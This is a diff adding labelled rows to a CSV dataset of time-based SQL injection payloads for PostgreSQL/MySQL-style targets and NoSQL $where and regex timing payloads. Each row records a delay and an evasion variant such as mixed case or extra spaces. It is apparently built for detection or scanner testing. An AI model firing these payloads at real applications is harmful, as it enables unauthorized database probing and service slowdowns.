+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",PostgreSQL,boolean_or_error,511,time-based-blind,3,none
+'; SELECT pg_sleep(3); --,PostgreSQL,direct_time,512,time-based-none,3,none
+'; SELECT pg_sleep(3); --,PostgreSQL,direct_time,513,time-based-injected_comment,3,injected_comment
+';     SELECT    pg_sleep(3);    --,PostgreSQL,direct_time,514,time-based-extra_spaces,3,extra_spaces
+'; SELECT pg_sleep(3); --,PostgreSQL,direct_time,515,time-based-nested_fn,3,nested_fn
+'; SELECt pg_SLeeP(3); --,PostgreSQL,direct_time,516,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,517,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',PostgreSQL,boolean_or_error,518,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",PostgreSQL,boolean_or_error,519,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,PostgreSQL,boolean_or_error,520,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",PostgreSQL,boolean_or_error,521,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",PostgreSQL,boolean_or_error,522,time-based-blind,5,none
+'; SELECT pg_sleep(5); --,PostgreSQL,direct_time,523,time-based-none,5,none
+'; SELECT pg_sleep(5); --,PostgreSQL,direct_time,524,time-based-injected_comment,5,injected_comment
+';   SELECT   pg_sleep(5);     --,PostgreSQL,direct_time,525,time-based-extra_spaces,5,extra_spaces
+'; SELECT pg_sleep(5); --,PostgreSQL,direct_time,526,time-based-nested_fn,5,nested_fn
+'; SElEct pg_SleEp(5); --,PostgreSQL,direct_time,527,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,528,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',PostgreSQL,boolean_or_error,529,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",PostgreSQL,boolean_or_error,530,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,PostgreSQL,boolean_or_error,531,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",PostgreSQL,boolean_or_error,532,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",PostgreSQL,boolean_or_error,533,time-based-blind,7,none
+'; SELECT pg_sleep(7); --,PostgreSQL,direct_time,534,time-based-none,7,none
+'; SELECT pg_sleep(7); --,PostgreSQL,direct_time,535,time-based-injected_comment,7,injected_comment
+';    SELECT  pg_sleep(7);  --,PostgreSQL,direct_time,536,time-based-extra_spaces,7,extra_spaces
+'; SELECT pg_sleep(7); --,PostgreSQL,direct_time,537,time-based-nested_fn,7,nested_fn
+'; sElECt pg_sleep(7); --,PostgreSQL,direct_time,538,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,539,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',PostgreSQL,boolean_or_error,540,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",PostgreSQL,boolean_or_error,541,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,PostgreSQL,boolean_or_error,542,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",PostgreSQL,boolean_or_error,543,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",PostgreSQL,boolean_or_error,544,time-based-blind,10,none
+'; SELECT pg_sleep(10); --,PostgreSQL,direct_time,545,time-based-none,10,none
+'; SELECT pg_sleep(10); --,PostgreSQL,direct_time,546,time-based-injected_comment,10,injected_comment
+';  SELECT     pg_sleep(10);    --,PostgreSQL,direct_time,547,time-based-extra_spaces,10,extra_spaces
+'; SELECT pg_sleep(10); --,PostgreSQL,direct_time,548,time-based-nested_fn,10,nested_fn
+'; SElEct Pg_slEEp(10); --,PostgreSQL,direct_time,549,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,550,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',PostgreSQL,boolean_or_error,551,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",PostgreSQL,boolean_or_error,552,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,PostgreSQL,boolean_or_error,553,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",PostgreSQL,boolean_or_error,554,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",PostgreSQL,boolean_or_error,555,time-based-blind,1,none
+' OR pg_sleep(1) --,PostgreSQL,direct_time,556,time-based-none,1,none
+' OR pg_sleep(1) --,PostgreSQL,direct_time,557,time-based-injected_comment,1,injected_comment
+'    OR     pg_sleep(1)    --,PostgreSQL,direct_time,558,time-based-extra_spaces,1,extra_spaces
+' OR pg_sleep(1) --,PostgreSQL,direct_time,559,time-based-nested_fn,1,nested_fn
+' oR Pg_sLeep(1) --,PostgreSQL,direct_time,560,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,561,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',PostgreSQL,boolean_or_error,562,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",PostgreSQL,boolean_or_error,563,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,PostgreSQL,boolean_or_error,564,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",PostgreSQL,boolean_or_error,565,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",PostgreSQL,boolean_or_error,566,time-based-blind,3,none
+' OR pg_sleep(3) --,PostgreSQL,direct_time,567,time-based-none,3,none
+' OR pg_sleep(3) --,PostgreSQL,direct_time,568,time-based-injected_comment,3,injected_comment
+'     OR   pg_sleep(3)     --,PostgreSQL,direct_time,569,time-based-extra_spaces,3,extra_spaces
+' OR pg_sleep(3) --,PostgreSQL,direct_time,570,time-based-nested_fn,3,nested_fn
+' OR Pg_sLeeP(3) --,PostgreSQL,direct_time,571,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,572,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',PostgreSQL,boolean_or_error,573,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",PostgreSQL,boolean_or_error,574,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,PostgreSQL,boolean_or_error,575,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",PostgreSQL,boolean_or_error,576,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",PostgreSQL,boolean_or_error,577,time-based-blind,5,none
+' OR pg_sleep(5) --,PostgreSQL,direct_time,578,time-based-none,5,none
+' OR pg_sleep(5) --,PostgreSQL,direct_time,579,time-based-injected_comment,5,injected_comment
+'     OR  pg_sleep(5)  --,PostgreSQL,direct_time,580,time-based-extra_spaces,5,extra_spaces
+' OR pg_sleep(5) --,PostgreSQL,direct_time,581,time-based-nested_fn,5,nested_fn
+' Or PG_sleEp(5) --,PostgreSQL,direct_time,582,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,583,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',PostgreSQL,boolean_or_error,584,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",PostgreSQL,boolean_or_error,585,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,PostgreSQL,boolean_or_error,586,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",PostgreSQL,boolean_or_error,587,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",PostgreSQL,boolean_or_error,588,time-based-blind,7,none
+' OR pg_sleep(7) --,PostgreSQL,direct_time,589,time-based-none,7,none
+' OR pg_sleep(7) --,PostgreSQL,direct_time,590,time-based-injected_comment,7,injected_comment
+'    OR  pg_sleep(7)    --,PostgreSQL,direct_time,591,time-based-extra_spaces,7,extra_spaces
+' OR pg_sleep(7) --,PostgreSQL,direct_time,592,time-based-nested_fn,7,nested_fn
+' Or Pg_SleEP(7) --,PostgreSQL,direct_time,593,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,594,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',PostgreSQL,boolean_or_error,595,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",PostgreSQL,boolean_or_error,596,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,PostgreSQL,boolean_or_error,597,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",PostgreSQL,boolean_or_error,598,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",PostgreSQL,boolean_or_error,599,time-based-blind,10,none
+' OR pg_sleep(10) --,PostgreSQL,direct_time,600,time-based-none,10,none
+' OR pg_sleep(10) --,PostgreSQL,direct_time,601,time-based-injected_comment,10,injected_comment
+'   OR     pg_sleep(10)   --,PostgreSQL,direct_time,602,time-based-extra_spaces,10,extra_spaces
+' OR pg_sleep(10) --,PostgreSQL,direct_time,603,time-based-nested_fn,10,nested_fn
+' OR PG_SLEeP(10) --,PostgreSQL,direct_time,604,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,605,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',PostgreSQL,boolean_or_error,606,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",PostgreSQL,boolean_or_error,607,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,PostgreSQL,boolean_or_error,608,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",PostgreSQL,boolean_or_error,609,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",PostgreSQL,boolean_or_error,610,time-based-blind,1,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(1) END) --,PostgreSQL,direct_time,611,time-based-none,1,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(1) END) --,PostgreSQL,direct_time,612,time-based-injected_comment,1,injected_comment
+'     AND     (SELECT   CASE  WHEN    (1=1)   THEN    pg_sleep(1)  END)     --,PostgreSQL,direct_time,613,time-based-extra_spaces,1,extra_spaces
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(1) END) --,PostgreSQL,direct_time,614,time-based-nested_fn,1,nested_fn
+' AND (seLeCt cAse WHeN (1=1) tHEN PG_SLEep(1) EnD) --,PostgreSQL,direct_time,615,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,616,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',PostgreSQL,boolean_or_error,617,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",PostgreSQL,boolean_or_error,618,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,PostgreSQL,boolean_or_error,619,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",PostgreSQL,boolean_or_error,620,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",PostgreSQL,boolean_or_error,621,time-based-blind,3,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) END) --,PostgreSQL,direct_time,622,time-based-none,3,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) END) --,PostgreSQL,direct_time,623,time-based-injected_comment,3,injected_comment
+'    AND    (SELECT    CASE  WHEN  (1=1)    THEN     pg_sleep(3)     END)  --,PostgreSQL,direct_time,624,time-based-extra_spaces,3,extra_spaces
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) END) --,PostgreSQL,direct_time,625,time-based-nested_fn,3,nested_fn
+' anD (sELEcT cASE WHen (1=1) ThEn pg_slEEP(3) eNd) --,PostgreSQL,direct_time,626,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,627,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',PostgreSQL,boolean_or_error,628,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",PostgreSQL,boolean_or_error,629,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,PostgreSQL,boolean_or_error,630,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",PostgreSQL,boolean_or_error,631,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",PostgreSQL,boolean_or_error,632,time-based-blind,5,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) END) --,PostgreSQL,direct_time,633,time-based-none,5,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) END) --,PostgreSQL,direct_time,634,time-based-injected_comment,5,injected_comment
+'  AND  (SELECT   CASE     WHEN   (1=1)    THEN   pg_sleep(5)     END)    --,PostgreSQL,direct_time,635,time-based-extra_spaces,5,extra_spaces
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) END) --,PostgreSQL,direct_time,636,time-based-nested_fn,5,nested_fn
+' AND (selEct casE WHen (1=1) THen pg_sLeeP(5) enD) --,PostgreSQL,direct_time,637,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,638,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',PostgreSQL,boolean_or_error,639,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",PostgreSQL,boolean_or_error,640,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,PostgreSQL,boolean_or_error,641,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",PostgreSQL,boolean_or_error,642,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",PostgreSQL,boolean_or_error,643,time-based-blind,7,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(7) END) --,PostgreSQL,direct_time,644,time-based-none,7,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(7) END) --,PostgreSQL,direct_time,645,time-based-injected_comment,7,injected_comment
+'   AND    (SELECT   CASE   WHEN     (1=1)     THEN     pg_sleep(7)     END)    --,PostgreSQL,direct_time,646,time-based-extra_spaces,7,extra_spaces
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(7) END) --,PostgreSQL,direct_time,647,time-based-nested_fn,7,nested_fn
+' ANd (Select CasE WheN (1=1) theN pg_SleEP(7) enD) --,PostgreSQL,direct_time,648,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,649,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',PostgreSQL,boolean_or_error,650,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",PostgreSQL,boolean_or_error,651,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,PostgreSQL,boolean_or_error,652,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",PostgreSQL,boolean_or_error,653,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",PostgreSQL,boolean_or_error,654,time-based-blind,10,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) END) --,PostgreSQL,direct_time,655,time-based-none,10,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) END) --,PostgreSQL,direct_time,656,time-based-injected_comment,10,injected_comment
+'  AND   (SELECT   CASE    WHEN   (1=1)   THEN    pg_sleep(10)    END)   --,PostgreSQL,direct_time,657,time-based-extra_spaces,10,extra_spaces
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) END) --,PostgreSQL,direct_time,658,time-based-nested_fn,10,nested_fn
+' anD (SELECT caSE When (1=1) then Pg_sleEp(10) enD) --,PostgreSQL,direct_time,659,time-based-mixed_case,10,mixed_case
+"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 1000){}; return true; }"" }",NoSQL,nosql_time,660,nosql-time,1,none
+"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 3000){}; return true; }"" }",NoSQL,nosql_time,661,nosql-time,3,none
+"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 5000){}; return true; }"" }",NoSQL,nosql_time,662,nosql-time,5,none
+"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 7000){}; return true; }"" }",NoSQL,nosql_time,663,nosql-time,7,none
+"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 10000){}; return true; }"" }",NoSQL,nosql_time,664,nosql-time,10,none
+"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,665,nosql-time,1,none
+"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,666,nosql-time,3,none
+"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,667,nosql-time,5,none
+"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,668,nosql-time,7,none
+"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,669,nosql-time,10,none
+"{""$where"": ""sleep(1)""}",NoSQL,nosql_time,670,nosql-time,1,none
+"{""$where"": ""sleep(3)""}",NoSQL,nosql_time,671,nosql-time,3,none
+"{""$where"": ""sleep(5)""}",NoSQL,nosql_time,672,nosql-time,5,none
+"{""$where"": ""sleep(7)""}",NoSQL,nosql_time,673,nosql-time,7,none
+"{""$where"": ""sleep(10)""}",NoSQL,nosql_time,674,nosql-time,10,none
+"{""$where"": ""for(i=0;i<1e5;i++){{}}; return true; ""}",NoSQL,nosql_time,675,nosql-time,1,none
+"{""$where"": ""for(i=0;i<1e7;i++){{}}; return true; ""}",NoSQL,nosql_time,676,nosql-time,3,none
+"{""$where"": ""for(i=0;i<1e9;i++){{}}; return true; ""}",NoSQL,nosql_time,677,nosql-time,5,none
+"{""$where"": ""for(i=0;i<1e11;i++){{}}; return true; ""}",NoSQL,nosql_time,678,nosql-time,7,none
+"{""$where"": ""for(i=0;i<1e14;i++){{}}; return true; ""}",NoSQL,nosql_time,679,nosql-time,10,none
